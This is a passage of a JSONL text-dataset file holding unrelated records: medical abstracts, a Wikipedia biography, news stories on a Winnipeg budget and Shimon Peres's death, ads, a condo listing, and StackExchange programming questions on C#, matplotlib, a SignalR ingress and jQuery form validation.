lacking. Hence, it is advisable that one does not embark on using each and any target for each and any indication without having the understanding or the team backup. It is cautionary that most of these therapies should be conducted in an institutional setting with an ethics and scientific committee backup and ably assisted by an experienced team.", "meta": {"pile_set_name": "PubMed Abstracts"}}
{"text": "Christopher Caldwell (government official)\n\nChristopher Caldwell is an American political aide and government official, currently serving as the Federal Co-Chairman of the Delta Regional Authority. Caldwell previously served as the director of special projects for U.S. Senator John Boozman. The DRA is responsible for bolstering economic development in a 252-county region of the Mississippi Delta spanning eight states. Caldwell served as campaign manager for Boozman's 2016 re-election campaign and as the political director for Boozman's 2010 U.S. Senate campaign. He has also served on several other campaigns, including Mike Huckabee's 2007 presidential bid and Tim Hutchinson's 2002 U.S. Senate campaign. The U.S. Senate confirmed Caldwell's nomination to the DRA  in December 2017 and he was sworn in to office on January 12, 2018.\n\nReferences\n\nCategory:Living people\nCategory:People from Little Rock, Arkansas\nCategory:Arkansas Republicans\nCategory:Trump administration personnel\nCategory:University of Arkansas alumni\nCategory:1963 births", "meta": {"pile_set_name": "Wikipedia (en)"}}
{"text": "--param-CPreProcessor:_expand=1\n--fields-C=+{macrodef}\n--fields=+Ss\n--sort=no\n# Override the defintion in the input file.\n-DS=float\n", "meta": {"pile_set_name": "Github"}}
{"text": "David Young\n\nDavid Young is a graduate of the City University MA Crime Writing course and was the recent winner of the PFD-sponsored course prize. He was born in Hull and educated in York and Bristol. Before becoming a full-time author he was a local news reporter and then an editor in the BBC World TV and radio newsrooms.\n\nHis debut novel, Stasi Child, a labyrinthine Cold War-era thriller and the first in a trilogy, was published in October 2015, by Twenty7 Books (Bonnier).\n\n- Contact -\n\nEast Germany, 1975. Karin M\u00fcller, sidelined from the murder squad in Berlin, jumps at the chance to be sent south to Halle-Neustadt, where a pair of infant twins have gone missing.\n\nBut M\u00fcller soon finds her problems have followed her. Halle-Neustadt is a new town \u2013 the pride of the communist state \u2013 and she and her team are forbidden by the Stasi from publicising the disappearances, lest they tarnish the town\u2019s flawless image.\n\nMeanwhile, in the eerily nameless streets and tower blocks, a child snatcher lurks, and the clock is ticking to rescue the twins alive . . .\n\nWhen Oberleutnant Karin M\u00fcller is called to investigate a teenage girl\u2019s body at the foot of the Wall, she imagines she\u2019s seen it all before. But when she arrives she realises this is a death like no other: it seems the girl was trying to escape \u2013 but from the West.\n\nM\u00fcller is a member of the People\u2019s Police, but in East Germany her power only stretches so far. The Stasi want her to discover the identity of the girl, but assure her the case is otherwise closed \u2013 and strongly discourage her asking questions.\n\nThe evidence doesn\u2019t add up, and M\u00fcller soon realises the crime scene has been staged. But this is not a regime that tolerates a curious mind, and M\u00fcller doesn\u2019t realise that the trail she\u2019s following will lead her dangerously close to home . . .", "meta": {"pile_set_name": "Pile-CC"}}
{"text": "If this is your first visit, be sure to\ncheck out the FAQ by clicking the\nlink above. You may have to register\nbefore you can post: click the register link above to proceed. To start viewing messages,\nselect the forum that you want to visit from the selection below.\n\nWelcome to Mac-Forums! Join us to comment and to customize your site experience! Members have access to different forum appearance options, and many more functions.\n\nOS X: Ok, so why is it that Mac OS X's Zoom button doesn't enlarge windows so that they fill the screen?\n\nApple's philosophy is that a maximized environment is inherintly inefficent since it makes dragging content from one window to another extremely cumbersome (read the section on Drag and Drop). Many types of documents are vertically oriented (like a printed page) yet monitors are wider than they are tall. So\u2014for instance\u2014 it doesn't make sense for a word processing document to fill the width of the screen.\n\nThe Zoom button toggles its window between 2 states, the standard state and the user state. The standard state is determined by the manufacturer of the program being used. Apple's User Interface Guidelines provides this sensible direction to programmers for deciding the standard state of a window.\"\n\nI just figured this out right now and knew where to come to get some help. I experienced this in a Mac Store when trying to maximize a window. How can you change it so it maximizes like on Windows XP? If i bought a mac, i would find this quite irritating.\n\nJust change the window size once manually for each program when you buy the Mac and you'll never have to do it again for those programs. It's annoying, yes, and I know no way around it. But it doesn't annoy me anymore because I resized all the windows when I got my Mac and now they don't give me any more problems.\n\nIf anybody knows a way to make it so that the zoom button maximizes, that would be great...", "meta": {"pile_set_name": "Pile-CC"}}
{"text": "Alle Corone restaurant\n\nAt \u201cAlle Corone\u201d Restaurant you will discover the real authentic flavors of our genuine products, prepared in accordance with our precious recipes. You will also discover the pleasure of savoring the best ingredients that our land can offer, following an itinerary of gastronomic excellence that, depending on the season, will take you from the starters to dessert.The bread, the homemade pasta and the desserts we serve all come straight out of our kitchen.", "meta": {"pile_set_name": "Pile-CC"}}
{"text": "Winnipeg homeowners will pay 2.33 per cent more in property tax and see a cut to road repairs in the 2019 budget passed by city council at a special meeting Wednesday.\n\nThe 2.33 per cent tax increase will mean the average household will pay about $40 more on their property tax bill. The money is slated to go to infrastructure spending.\n\n\"We have to build this city for the future,\" said Mayor Brian Bowman. \"This budget moves us in the right direction but not as fast as I'd like in terms of [road spending].\"\n\nThere is no frontage levy increase in 2019 and there are no new fees or charges included in the budget.\n\nWhile tweaks were made to the spending plan since it was tabled March 1, the bulk of the document remains unchanged.\n\nThe budget now includes money to hire a supervisor of urban forestry in the public works department to plan and oversee the city's response to the emerald ash borer \u2014 an insect with a history of devastating populations of ash trees.\n\nThe budget will also see the one-time $500,000 funding cut to the Winnipeg Arts Council's public art program, which was proposed in the initial budget, spread out over two years \u2014 a $250,000 cut in 2019 and the same in 2020.\n\nWinnipeg plans to spend $86 million fixing its roads in 2019, down $30 million from the $116 million budgeted last year. The cut means spending on repairs for residential streets and lanes will be frozen this year.\n\nBowman argues the province still owes Winnipeg $40 million in road renewal funding, and says that shortfall is behind the reduction in this year's road spending.\n\n2.33% hikes may not be sustainable: Bowman\n\nThe province's Progressive Conservative government denies any obligation to pay the $40 million and says there was a political commitment \u2014 by the previous NDP government \u2014 to fund a five-year roads plan.\n\n\"None of these political commitments bound a successor government,\" provincial Municipal Relations Minister Jeff Wharton said in an open letter to Bowman on Monday.\n\nCity council finance chair Scott Gillingham (St. James) argues the Tory government, by funding the third and fourth years of the five-year program, committed itself to the road renewal funding plan for its fifth year.\n\nDuring the 2018 mayoral campaign, Bowman pledged to keep property tax increases to 2.33 per cent per year over the next four years \u2014 provided the province didn't reduce its funding to the city.\n\nHe said Wednesday property taxes may go up more than that in the coming years if the city does not get more help from Manitoba.\n\n\"I'm unsure whether this is a sustainable approach going forward,\" he said. \"My campaign commitment was 2.33 per cent unless there's new incremental cuts from the province.\"\n\nThe budget also includes a promise of a low-income bus pass, money for bus safety improvements and a freeze on transit fares.\n\nBoth the operating and capital budgets for 2019 were approved in an 11-5 vote at Wednesday's meeting.\n\nCouncillors Kevin Klein (Charleswood\u2013Tuxedo\u2013Westwood), Janice Lukes (Waverley West), Shawn Nason (Transcona), Ross Eadie (Mynarski) and Jason Schreyer (Elmwood) voted against the plan.\n\nA separate clause in the budget proposed using part of the 2.33 per cent property tax increase to fix bridges, along with roads and building rapid transit. The clause was approved in a 12-4 vote.", "meta": {"pile_set_name": "OpenWebText2"}}
{"text": "Regulating intensity using perceived exertion in spinal cord-injured participants.\nTo examine the validity of perception-based intensity regulation during handcycling exercise. Eight spinal cord-injured (T11 incomplete to T4 complete) participants completed an incremental exercise test followed by a (.)VO2peak test using a sports hand bike. Subsequently, two 20-min exercise tests were completed at an individualized power output (PO) at moderate and vigorous intensities (50% and 70% of (.)VO2peak, respectively). On a separate occasion, participants were instructed to produce and maintain a workload equivalent to the average RPE for the 20-min imposed condition in a counterbalanced order. The (.)VO2 and blood lactate concentration [BLa(-)] were measured every 10 min, and HR and PO were measured at 1-min intervals. There were no differences in average (.)VO2, percent V O2peak, HR, PO, and [BLa(-)] between the imposed PO conditions and RPE-regulated trials of either exercise intensity. Although PO increased slightly during the moderate-intensity RPE-regulated trial (P < 0.04), it remained relatively constant in the vigorous RPE-regulated trial. However, there was a tendency for PO to be slightly higher (P = 0.07) in the vigorous RPE-regulated trial. These data suggest that RPE is effective in controlling moderate and vigorous intensities throughout a 20-min handcycling exercise session for SCI participants.", "meta": {"pile_set_name": "PubMed Abstracts"}}
{"text": "Shimon Peres, a former Israeli president and a towering figure who concluded the Oslo Accords during his term as Foreign minister, died Tuesday at age 93.\nFor many Israelis, Peres is regarded as the founding generation who assisted in the establishment of the Jewish State. The groundbreaking, first-time-ever peace agreement between Israel and Palestine was also signed under his pen.\nPalestinian president Mahmoud Abbas told the i24News that \u201cPeres\u2019 death is a great loss to humanity and the region.\u201d\nBut he remains as a controversial figure among Palestinians. He was also unloved by right-wing Israelis for his trying to promote peace between two sides, which prevented him to break into the prime minister's post.\n\u201cFor the Palestinians, he will be seen as the man who has not implemented the Oslo Accords,\u201d Leila Shahid, the former Palestinian ambassador in the European Union, commented in an interview on France Info on Wednesday.\nDiana Buttu, a former Palestinian peace negotiator commented that many will remember Peres as a \u201cwar criminal\u201d.\n\u201cHe's somebody who believed in the ethnic cleansing of Palestine,\u201d added Buttu.\nAl Jazeera's Middle East analyst Yehia Ghanem said in an interview that \u201cpeople who are praising him [Peres] supported Israel and all of its crimes throughout its history.\u201d Referring to the 1996 Qana Massacre, which killed at least 106 people in a village in Southern Lebanon, he described the bloodshed as a war crime followed by Peres\u2019 command as the Prime Minister.\nAfter the announcement of his death by his son, world leaders pay tribute on Wednesday.\nCalling him \u201ca soldier for Israel\u201d and \u201ca friend\u201d, US president Barack Obama expressed his sorrow in a White House statement that he felt the Americans are \u201cin his debt\u201d. He praised Peres\u2019 diplomatic efforts on bringing together Israel and the US: \u201cno one did more over so many years as Shimon Peres to build the alliance between our two countries\u201d.\nHe was hailed as the \u201cpolitical giant\u201d by Former British Prime Minister Tony Blair, and \u201can optimist about the prospects for reconciliation and peace\u201d by UN Secretary General Ban Ki-moon.\nPeres won the 1994 Nobel Peace Prize laureate, jointly with Prime Minister Yitzhak Rabin and the former Palestinian president Yasser Arafat, for their role in negotiating the Oslo Accords. It was aimed to the achievement of an independent Palestinian state.\nHe spent the first half of his political life ensuring Israeli military might and security, appointed several times to crucial roles such as Foreign minister and Defense minister.\nDuring the 1950s, he reached a secret agreement with France to build a nuclear reactor at Dimona in the Negev desert. According to the US-based Nuclear Threat Initiative, the nuclear power reactor can produce estimated 100 and 200 nuclear warheads and remains as the biggest and sole nuclear armed-power in the Middle East.\nPeres dedicated the second half in pursuit of bringing peace to his country. Before taken up the post of the ninth president of Israel in 2007, he served twice as prime minister, first between 1984 and 1986 with Likud; then later again after the assassination of former Prime Minister Yitzhak Rabin in 1995.\nHe stayed in power until 1996 when he lost the election to Benjamin Netanyahu whom has been in premiership up to date.\nIn his later years, he became Israel's moderate face under the hardheaded leadership of Netanyahu. He insisted many times that peace between Israel and Palestine is around the corner and will not hesitate \u201cto extend my life for a year or two\u201d to promote that goal, told Peres in a 2013 interview.\nHe once spoke at the UN that \u201cThe time has come to comprehend that the real triumph is in the harvest of peace, not in the seeds of another war.\u201d\nHowever, he never had been fully entrusted by Israeli voters.\n\u201cAt the ballot box they preferred a stern right winger in government,\u201dconcluded analyst Anshel Pfeffer. That is to say, today Peres\u2019 death might lead to an end to the last flicker of hope in bringing the already tightened Israeli-Palestinian conflict into peace.", "meta": {"pile_set_name": "Pile-CC"}}
{"text": "The invention relates generally to internal combustion engines, and, more particularly, to exhaust gas systems and arrangements for such engines.\nThe invention also relates to outboard motors and to engines and exhaust gas discharge arrangements for such outboard motors.\nThe invention also relates to diminishing discharge of unburned combustibles into the atmosphere by facilitating combustion thereof in the exhaust pipe prior to discharge.", "meta": {"pile_set_name": "USPTO Backgrounds"}}
{"text": "Check out these Stan lee limited edition collectors POW! rings .925 sterling silver, only 250 made. Each ring comes with a certificate of authenticity signed by Stan \"The Man\" himself as well as a glass cubical display case and a custom Revolution1jewelry pouch. Available in both pewter and silver from sizes 5-15 at: http://powentertainment.cinderblock.com/ & http://www.revolution1jewelry.com .\n\nSo what are you waiting for, show your POW! pride today with these one of a kind rings!", "meta": {"pile_set_name": "Pile-CC"}}
{"text": "Q:\n\nCreate User profile with separate social media data\n\nI am creating user profile logic for a blogging platform.  I have the UserProfile model and then two separate models, UserSocialLink and SocialLinkType to control the user's various social media contacts (i.e. Facebook, Twitter, Google+, etc...).  I am looking for feed back on the execution of the methods used to Add new UserProfiles.  Is this the way you would handle it? Is there a better way? What are some of the issues you see with my methods (specifically in the service class)?\nThe Models\npublic class UserProfile\n{\n    public int Id { get; set; }\n    public string UserName { get; set; }\n    public string FirstName { get; set; }\n    public string LastName { get; set; }\n    public string ProfilePicUrl { get; set; }\n    public string Location { get; set; }\n    public string DateOfBirth { get; set; }\n    public string Bio { get; set; }\n    public DateTime Created { get; set; }\n    public DateTime Updated { get; set; }\n }\n\npublic class UserSocialLink\n{\n    public int Id {get; set;}\n    public int UserProfileId { get; set; }\n    public int SocialLinkTypeID { get; set; }\n    public string LinkValue { get; set; }\n    public DateTime Created { get; set; }\n    public DateTime Updated { get; set; }\n\n    public virtual UserProfile UserProfile { get; set; }\n    public virtual SocialLinkType SocialLinkType {get; set;}\n}\n\npublic class SocialLinkType\n{\n    public int Id { get; set; }\n    public string LinkType { get; set; }\n    public string URLFormat { get; set; }\n}\n\nThe Add Methods in The Service Class\npublic class UserProfileService : IUserProfileService\n{\n    public UserProfile Add(UserProfile userProfile)\n    {\n        var now = DateTime.UtcNow;\n\n        if (userProfile == null)\n            throw new ArgumentNullException(\"User Profile\");\n\n        userProfile.Created = now;\n        userProfile.Updated = now;\n        using (var db = new ApplicationDbContext())\n        {\n            db.UserProfiles.Add(userProfile);\n            db.SaveChanges();\n        }\n        return userProfile;\n    }\n\n    public UserProfile AddSocialLink(string userName, UserSocialLink userSocialLink, string socialLinkType)\n    {\n        var now = DateTime.UtcNow;\n        var userProfile = Get(userName);\n        if (userProfile == null)\n            throw new Exception(\"User Profile Not Found\");\n        using (var db = new ApplicationDbContext())\n        {\n            var linkType = db.SocialLinkTypes.SingleOrDefault(p => p.LinkType.ToUpper() == socialLinkType.ToUpper());\n            if (linkType == null)\n                throw new Exception(\"Social Media Type Not Found\");\n            userSocialLink.Created = now;\n            userSocialLink.Updated = now;\n            userSocialLink.SocialLinkTypeID = linkType.Id;\n            db.UserSocialLinks.Add(userSocialLink);\n            db.SaveChanges();\n            return userProfile;\n         }\n    }\n}\n\nRelated GitHub Issue #14\n\nA:\n\npublic UserProfile AddSocialLink(string userName, UserSocialLink userSocialLink, string socialLinkType)\n\nShouldn't the socialLinkType be a property of the UserSocialLink class? It seems odd to me that the code has to pass a string along with the object in order to tell the method what type it is. That said, I really do like that you're checking the database to make sure the type is valid. Now that I think of it, why pass the user name as a string? Wouldn't it be a simpler API to pass a UserProfile in? At least, it would be more consistent for the dev using the UserProfileService. \n\nThis code is a great example of why we should all use proper indentation and braces around if statements. \n\nvar linkType = db.SocialLinkTypes.SingleOrDefault(p => p.LinkType.ToUpper() == socialLinkType.ToUpper());\nif (linkType == null)\n    throw new Exception(\"Social Media Type Not Found\");\nuserSocialLink.Created = now;\nuserSocialLink.Updated = now;\nuserSocialLink.SocialLinkTypeID = linkType.Id;\ndb.UserSocialLinks.Add(userSocialLink);\ndb.SaveChanges();\nreturn userProfile;\n\nAt a glance, it looks like the userSocialLink only gets it's properties set if (linkType == null) and after an exception is thrown. Of course, this is ridiculous and not what is actually happening, but braces make that crystal clear to Mr. Maintainer. \nvar linkType = db.SocialLinkTypes.SingleOrDefault(p => p.LinkType.ToUpper() == socialLinkType.ToUpper());\nif (linkType == null)\n{\n    throw new Exception(\"Social Media Type Not Found\");\n}\nuserSocialLink.Created = now;\nuserSocialLink.Updated = now;\nuserSocialLink.SocialLinkTypeID = linkType.Id;\ndb.UserSocialLinks.Add(userSocialLink);\ndb.SaveChanges();\nreturn userProfile;\n\nA:\n\nIn addition RubberDuck's answer about the braces:  \nInside the AddSocialLink() method you have this  \n\nvar userProfile = Get(userName);\nif (userProfile == null)\n    throw new Exception(\"User Profile Not Found\");\n\nHere, with the usage of var, it isn't obvious what datatype is assigned to userProfile. The methodname Get does not reflect anything to make it more clear.\nSure, Mr.Maintainer could assume, as this is the UserProfileService, that the return type would be a UserProfile, but it would be more explicit to add a ExistUserProfile() method which just returns a boolean.  \nprivate Boolean ExistUserProfile(String userName)\n{\n    UserProfile userProfile = Get(userName);\n    return userProfile != null;\n}\n\nThe UserProfileService class does violate the Single responsibility principle as it is responsible to add, get etc UserProfile data and at least to also add UserSocialLink data.\nThis is also reflected clearly in the question title: \"Create User profile with separate social media data\".  \nReturning a UserProfile object from this method does not make any sense, as the code isn't changing any property of the retrieved userprofile.\nA user of the UserProfileService class wouldn't expect that adding a SocialLink by calling the AddSocilaLink() method would return a UserProfile object.\n\n", "meta": {"pile_set_name": "StackExchange"}}
{"text": "Q:\n\nmatplotlib imshow() with irregular spaced data points\n\nI am trying to put some data into an imshow() plot.\nMy problem is that the data does not come as a MxN array but as a 3xN array (x- and y coordinate and value). The points are NOT arranged as a regular grid but lie within [xmin,xmax,ymin and ymax]=[-pi/2,pi/2,0,3.5].\nIn [117]: shape(data)\nOut[117]: (3L, 102906L)\n\nHow can I get a nice image plot from that data?\nThank you very much for any help.\nbtw the data represents temperature values on the surface of a rod as a function of axial and azimuthal position, think of a cfd-mesh.\n\nA:\n\nI recommend using the griddata-method for interpolation. A sample would be:\nimport numpy as np\nfrom matplotlib.mlab import griddata\nimport matplotlib.pyplot as plt\n\nxs0 = np.random.random((1000)) * np.pi - np.pi/2\nys0 = np.random.random((1000)) * 3.5\nzs0 = np.random.random((1000))\n\nN = 30j\nextent = (-np.pi/2,np.pi/2,0,3.5)\n\nxs,ys = np.mgrid[extent[0]:extent[1]:N, extent[2]:extent[3]:N]\n\nresampled = griddata(xs0, ys0, zs0, xs, ys)\n\nplt.imshow(resampled.T, extent=extent)\nplt.plot(xs0, ys0, \"r.\")\nplt.plot(xs, ys, \"b.\")\nplt.title(\"imshow for irregularly spaced data using griddata\")\nplt.show()\n\nI guess transition from your 3*X-array to three X-arrays is obvious.\nThe result is:\n\nRed points show the \"original\" positions of the data, blue points for the now regularly spaced data.\ngriddata returns a masked array. All points for which the interpolation cannot be evaluated are masked and then plotted as white areas.\nHTH,\nThorsten\n\n", "meta": {"pile_set_name": "StackExchange"}}
{"text": "As in the Stony Brook game Vanderbilt got off to a slow start, missing its first two shots and suffering two turnovers to fall behind 5-0 before Matthew Fisher Davis nailed a 3-pointer to put the Dores on board.\n\nVanderbilt then went on a 16-2 run to take a 19-7 lead with 9:25 to go in the first half.\n\nA three pointer by Wade Baldwin the IV extended Vandy\u2019s lead to 28-12 with 7:29 to go in the half. Baldwin would go on to score 20 points with two three-pointers during the game.\n\nAnother three pointer by Fisher Davis put Vandy firmly in command with a 33-12 lead with 7 minutes to play in the half.\n\nFisher Davis made four threes during the game including 3 of 4 in the opening stanza.\n\nAfter a Kevin Stallings tirade following a vandy defensive breakdown the Titans would not score the last 2:33 of the half and the Commodores would head to the locker room up 47-20.\n\nNolan Cressler was second on the team with 14 points, shooting 50 percent from the field with two three\u2019s.\n\nWith 5:29 to go in the game Cressler put an exclamation point on the Vanderbilt victory with a huge dunk that put Vandy up 93-42.\n\nLuke Kornet led the \u2018Dores with 11 rebounds and five blocked shots in only 16 minutes of play.\n\nThe \u2018Dores got even hotter in the second half, shooting 59.4% from the field, while hitting five of 11 three pointers.\n\nNext up for Vanderbilt is a visit to 25th ranked Baylor on Sunday December 6.\n\nFor Vandymania.com and Scout this is D.T. Yates", "meta": {"pile_set_name": "OpenWebText2"}}
{"text": "The ARIA Engine is a 64-bit Sampler/Synthesis Engine, developed by Plogue Art et Technologie Inc in collaboration with Garritan Corp. It is based on the SFZ 1.0 / SFZ 2.0 open file formats for instrument programming and the Scala open file format to define scales and temperaments.", "meta": {"pile_set_name": "Pile-CC"}}
{"text": "Description\n\nLovely, fully furnished 1st floor end unit 2 bedroom, 2 bath condo in Turnberry Park at Legends Golf Resort. On the 8th hole of Parkland signature course. Open concept kitchen and living room with nice breakfast bar and dining area. Spacious master bedroom with master bath and oversized shower. Bedroom 2 nice size and large full bath. Laundry area in the unit with lots of storage. Condo has new rugs and been freshly painted. Unit has not been rented in last 2 years, just vacation property. Great investment potential, can be put on the legends golf rental program. This unit is move in ready. Legends is a great community with walking and bike paths. Amenities include gated and nightly security, multiple outdoor pools, grilling, lounging area and tennis courts. If you are a golfer, Legends Golf offers multiple types of golf memberships with 3 of the finest golf courses in Myrtle Beach. Grand clubhouse with restaurant, Ailsa pub restaurant and tremendous golf practice facilities. Always a game going on. What else can you ask for? Legends Golf Community is the hidden gem of Myrtle Beach. Just minutes away from beaches and shopping. Low HOAs, a must see condo with great rental potential.\n\nSchool Information\n\nDescription\n\nLovely, fully furnished 1st floor end unit 2 bedroom, 2 bath condo in Turnberry Park at Legends Golf Resort. On the 8th hole of Parkland signature course. Open concept kitchen and living room with nice breakfast bar and dining area. Spacious master bedroom with master bath and oversized shower. Bedroom 2 nice size and large full bath. Laundry area in the unit with lots of storage. Condo has new rugs and been freshly painted. Unit has not been rented in last 2 years, just vacation property. Great investment potential, can be put on the legends golf rental program. This unit is move in ready. Legends is a great community with walking and bike paths. Amenities include gated and nightly security, multiple outdoor pools, grilling, lounging area and tennis courts. If you are a golfer, Legends Golf offers multiple types of golf memberships with 3 of the finest golf courses in Myrtle Beach. Grand clubhouse with restaurant, Ailsa pub restaurant and tremendous golf practice facilities. Always a game going on. What else can you ask for? Legends Golf Community is the hidden gem of Myrtle Beach. Just minutes away from beaches and shopping. Low HOAs, a must see condo with great rental potential.\n\nProperty Description\n\nLovely, fully furnished 1st floor end unit 2 bedroom, 2 bath condo in Turnberry Park at Legends Golf Resort. On the 8th hole of Parkland signature course. Open concept kitchen and living room with nice breakfast bar and dining area. Spacious master bedroom with master bath and oversized shower. Bedroom 2 nice size and large full bath. Laundry area in the unit with lots of storage. Condo has new rugs and been freshly painted. Unit has not been rented in last 2 years, just vacation property. Great investment potential, can be put on the legends golf rental program. This unit is move in ready. Legends is a great community with walking and bike paths. Amenities include gated and nightly security, multiple outdoor pools, grilling, lounging area and tennis courts. If you are a golfer, Legends Golf offers multiple types of golf memberships with 3 of the finest golf courses in Myrtle Beach. Grand clubhouse with restaurant, Ailsa pub restaurant and tremendous golf practice facilities. Always a game going on. What else can you ask for? Legends Golf Community is the hidden gem of Myrtle Beach. Just minutes away from beaches and shopping. Low HOAs, a must see condo with great rental potential.", "meta": {"pile_set_name": "Pile-CC"}}
{"text": "Q:\n\nSignalR connection via K8S Ingress\n\nI'm trying to expose a SignalR hub hosted in a Kubernetes (Azure) pod. Basically, the authentication and the handshake steps work fine, but when I trigger some action, all clients connected via the k8s Ingress doesn't receive the message. Has anybody experienced this issue or just have shared SignalR hubs through Kubernetes - Ingress? \ningress.yml\napiVersion: extensions/v1beta1\nkind: Ingress\nmetadata:\n  name: endpoints\n  annotations:\n    kubernetes.io/ingress.class: addon-http-application-routing\n    ingress.kubernetes.io/ssl-redirect: \"false\"  \n    nginx.ingress.kubernetes.io/ssl-redirect: \"false\"  \n    nginx.org/websocket-services: \"myservice\"\nspec:\n  rules:\n  - host: api.[MY-DOMAIN].com\n    http:\n      paths:\n      - backend:\n          serviceName: myservice\n          servicePort: 80\n        path: /myservice\n\nA:\n\nTry: \nannotations:\n    kubernetes.io/ingress.class: nginx\n    nginx.ingress.kubernetes.io/ssl-redirect: \"false\"\n    nginx.ingress.kubernetes.io/affinity: cookie\n    nginx.ingress.kubernetes.io/session-cookie-hash: sha1\n    nginx.ingress.kubernetes.io/session-cookie-name: REALTIMESERVERID\n\nI wrote a sample project a while back, if you want a working example: DenisBiondic/RealTimeMicroservices\nAs a side note, consider using Azure SignalR Service, it should remove many headaches (also in the example above).\n\n", "meta": {"pile_set_name": "StackExchange"}}
{"text": "clinton. in the 1980 republican primary george bush had momentagainstronaldreagan, untilin the debate in new hampshire, there was a moment where reagan looked strong. >> i am paying for this microphone. >> that moment helped change the campaign. >> some o some of them you can . >> read my lips. no new taxes. >> the difference between a hockey mom and a pit bull, lipstick. >> other ones, you got to depend on your candidate seizing a moment you didn't expect to happen. >> there you go again. >> most moments so far this election have been poorly phrased comments. >> if you've got a business, you didn't build that. somebody else made that happen. >> i like being able to fire people that provide services to me. >> they'll put y'all back in chains. >> the media call those gaffes, but often the media don't know. when ed musky lost the '072 primary because he looked like he teared up defending his wife, everyone said candidates can't career, because that's week, but then in 2008 hillary clinton cried. >> you know, i have so many opportunities from this country. >> she began to tear up. >> don", "meta": {"pile_set_name": "Pile-CC"}}
{"text": "The dominant hemimelia mutation uncouples epithelial-mesenchymal interactions and disrupts anterior mesenchyme formation in mouse hindlimbs.\nEpithelial-mesenchymal interactions are essential for both limb outgrowth and pattern formation in the limb. Molecules capable of communication between these two tissues are known and include the signaling molecules SHH and FGF4, FGF8 and FGF10. Evidence suggests that the pattern and maintenance of expression of these genes are dependent on a number of factors including regulatory loops between genes expressed in the AER and those in the underlying mesenchyme. We show here that the mouse mutation dominant hemimelia (Dh) alters the pattern of gene expression in the AER such that Fgf4, which is normally expressed in a posterior domain, and Fgf8, which is expressed throughout are expressed in anterior patterns. We show that maintenance of Shh expression in the posterior mesenchyme is not dependent on either expression of Fgf4 or normal levels of Fgf8 in the overlying AER. Conversely, AER expression of Fgf4 is not directly dependent on Shh expression. Also the reciprocal regulatory loop proposed for Fgf8 in the AER and Fgf10 in the underlying mesenchyme is also uncoupled by this mutation. Early during the process of limb initiation, Dh is involved in regulating the width of the limb bud, the mutation resulting in selective loss of anterior mesenchyme. The Dh gene functions in the initial stages of limb development and we suggest that these initial roles are linked to mechanisms that pattern gene expression in the AER.", "meta": {"pile_set_name": "PubMed Abstracts"}}
{"text": "Q:\n\nJavaScript form validation for selection field, check value is not 0\n\nI have a form that is to add a module to the database, and I have a select field in the form of values 0,1,2,3 ... 0 = invalid and i know i can disable the first field but i don't know if it interferes with the validation process.\nNote: rest works fine just when its validating it gets stuck when it gets to the module type (selection)\n<?php\ninclude(\"../authorise.php\");\nauthorise_user(\"3\");\n?>\n<script src=\"https://code.jquery.com/jquery-2.2.0.min.js\"></script>\n<script src=\"https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js\"></script>\n<body>\n<div>\n   <form id=\"myForm\" method=\"post\">\n      <label for=\"module_name\">Module Name:</label>\n      <input name=\"module_name\" id=\"module_name\" type=\"text\" /><br />\n      <label for=\"module_code\">Module Code:</label>\n      <input name=\"module_code\" id=\"module_code\" type=\"text\" /><br />\n      <label for=\"module_leader\">Module Leader:</label>\n      <input name=\"module_leader\" id=\"module_leader\" type=\"text\" /><br />\n      <label for=\"module_type\">Module Type:</label>\n      <select name=\"module_type\" id=\"module_type\">\n         <option value=\"0\" selected=\"selected\">Please select a module type.</option>\n         <option value=\"1\">Lecture</option>\n         <option value=\"2\">Seminar</option>\n         <option value=\"3\">Lab Practical</option>\n      </select> \n      <label for=\"module_location\">Module Location:</label>\n      <input name=\"module_location\" id=\"module_location\" type=\"text\" /><br />\n      <label for=\"module_date\">Module Date:</label>\n      <input name=\"mnodule_date\" id=\"mnodule_date\" type=\"text\" /><br />\n      <input type=\"button\" id=\"submitFormData\" onclick=\"SubmitFormData();\" value=\"Submit\" />\n   </form>\n</div>\n<div id=\"error\"></div>\n</body>\n<script>\nfunction SubmitFormData() {\n   var name = $(\"#module_name\").val();\n   var code = $(\"#module_code\").val();\n   var leader = $(\"#module_leader\").val();\n   var type = $(\"#module_type\").val();\n   var location = $(\"#module_location\").val();\n   var date = $(\"#module_date\").val();\n   var validModCode = /[a-zA-Z]{3}\\d{6}/\n      if((name.length < 6)) {   5\n         var message = \"Module Name must be atleast 6 characters.\";\n         $('#error').html(message);\n         $(\"#module_name\").focus();\n         return false; \n      } else if(code == \"\") {    \n         var message = \"Enter a Module Code.\";\n         $('#error').html(message);\n         $(\"#module_code\").focus();\n         return false; \n      } else if(!validModCode.test(code)){\n         var message = \"Invalid Module Code (Format: 3 a-z characters, followed by 6 numeric digits ... e.g. MOD002769).\"; \n         $('#error').html(message);\n         $(\"#module_code\").focus();\n         return false; \n      } else if (leader.length < 6) {\n         var message = \"Module leader must be atleast 6 characters.\"; \n         $('#error').html(message);\n         $(\"#module_leader\").focus();\n         return false;  \n      } else if(type.value == 0) {\n         var message = \"Please choose a Module Type.\";\n         $('#error').html(message);\n         $(\"#module_type\").focus();\n         return false;\n      } else if (location.length < 6) {        \n         var message = \"Module location must be atleast 8 characters.\"; \n         $('#error').html(message);\n         $(\"#module_location\").focus();\n      } else if (date.length < 6) {        \n         var message = \"Module date must include a day and a time.\"; \n         $('#error').html(message);\n         $(\"#module_date\").focus();\n      } else { \n         $('#error').html(\"Adding Module\");\n         $.post(\"addModuleSubmit.php\", { \n            name:name,\n            code:code,\n            leader:leader,\n            type:type,\n            location:location,\n            date:date\n      }, function(data) {\n         $('#error').html(data);\n         $('#myForm').trigger('reset');\n      });\n   }\n}\n</script>\n\nA:\n\nGive like this\nvar type =  $(\"#module_type option:selected\").val();\n\nthen give check condition like\nif(type == 0){ //code }\n\n", "meta": {"pile_set_name": "StackExchange"}}
